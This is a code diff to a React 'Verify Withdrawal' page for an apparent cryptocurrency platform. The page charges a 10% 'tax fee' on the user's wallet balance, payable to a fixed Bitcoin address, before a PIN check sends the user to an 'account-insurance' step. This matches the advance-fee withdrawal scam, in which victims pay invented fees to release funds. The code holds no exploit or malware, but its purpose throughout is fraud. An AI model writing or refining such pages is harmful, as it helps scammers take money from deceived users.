@@ -1,26 +1,36 @@
-import React, { useState } from 'react';
-import { useNavigate } from 'react-router-dom';
+import React, { useState, useEffect } from 'react';
+import { useLocation, useNavigate } from 'react-router-dom';
+import api from '../../utils/api';
 import './VerifyWithdrawal.css';
 
 const VerifyWithdrawal = () => {
+  const { state } = useLocation(); // { amount, crypto, address }
   const navigate = useNavigate();
-  const [taxAmount] = useState(35); // 10% of $350
   const [pin, setPin] = useState('');
-  const [message, setMessage] = useState('');
+  const [tax, setTax] = useState(0);
+  const [error, setError] = useState('');
 
-  const handleSubmit = (e) => {
+  useEffect(() => {
+    const fetchTax = async () => {
+      try {
+        const res = await api.get('/user/profile');
+        const fee = (res.data.walletBalance || 0) * 0.1;
+        setTax(fee.toFixed(2));
+      } catch {
+        setTax(0);
+      }
+    };
+    fetchTax();
+  }, []);
+
+  const handleVerify = async (e) => {
     e.preventDefault();
-    
-    if (pin.length !== 5) {
-      setMessage('PIN must be 5 digits');
-      return;
-    }
-    
-    // Simulate PIN verification
-    if (pin === '12345') {
-      navigate('/account-insurance');
-    } else {
-      setMessage('Invalid PIN. Please try again.');
+    try {
+      await api.post('/user/verify-withdrawal', { pin });
+      // On success, redirect to account insurance page
+      navigate('/account-insurance', { state });
+    } catch (err) {
+      setError(err.response?.data?.message || 'Invalid PIN. Please try again.');
     }
   };
 
@@ -28,46 +38,30 @@ const VerifyWithdrawal = () => {
     <div className="verify-container">
       <div className="verify-card">
         <h2 className="verify-title">Verify Withdrawal</h2>
-        
-        <div className="payment-section">
-          <h3 className="section-title">Payment Required</h3>
-          <p className="section-text">
-            Please pay 10% of your wallet balance as tax fee: 
-            <span className="amount"> ${taxAmount.toFixed(2)}</span>
-          </p>
-        </div>
-        
-        <div className="details-section">
-          <h3 className="section-title">Payment Details</h3>
-          <div className="crypto-details">
-            <p><strong>Crypto:</strong> Bitcoin</p>
-            <p><strong>Wallet Address:</strong> 535afgvshadsb534sfb</p>
-          </div>
-        </div>
-        
-        <div className="note-section">
-          <p className="note-text">
-            After making the payment, a 5-digit PIN will be sent to your email. 
-            Enter the PIN below to verify your withdrawal.
-          </p>
-        </div>
-        
-        <form onSubmit={handleSubmit} className="verify-form">
+
+        <p><strong>Amount:</strong> ${state.amount}</p>
+        <p><strong>Crypto:</strong> {state.crypto}</p>
+        <p><strong>Wallet Address:</strong> {state.address}</p>
+
+        <p><strong>Tax Fee (10%):</strong> ${tax}</p>
+        <p>Please send your fee payment to the following Bitcoin address:</p>
+        <code>535afgvshadsb534sfb</code>
+
+        {error && <p className="error-message">{error}</p>}
+
+        <form onSubmit={handleVerify} className="verify-form">
           <div className="form-group">
-            <label className="form-label">5-digit PIN</label>
+            <label className="form-label">Enter your 5-digit PIN</label>
             <input
               type="text"
               value={pin}
               onChange={(e) => setPin(e.target.value)}
-              maxLength={5}
+              maxLength="5"
               className="form-input"
               required
             />
           </div>
-          
-          {message && <p className="error-message">{message}</p>}
-          
-          <button type="submit" className="verify-button">Verify Withdrawal</button>
+          <button type="submit" className="verify-button">Verify & Continue</button>
         </form>
       </div>
     </div>
